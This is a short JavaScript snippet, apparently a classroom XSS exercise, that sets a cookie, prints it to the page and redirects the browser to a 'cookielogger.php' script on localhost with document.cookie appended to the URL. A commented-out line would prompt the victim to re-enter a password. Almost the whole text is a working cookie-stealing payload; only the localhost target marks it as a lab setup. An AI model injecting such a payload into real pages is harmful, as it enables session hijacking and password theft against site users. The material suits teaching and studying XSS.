//pw = window.prompt('Please confirm your password');
document.cookie='name='+'hello class'+';path=/;expires=86400';
document.write('cookie: ' + document.cookie);
window.location="http://localhost/exam/Data_Security/7.XSS/cookielogger.php?c="+document.cookie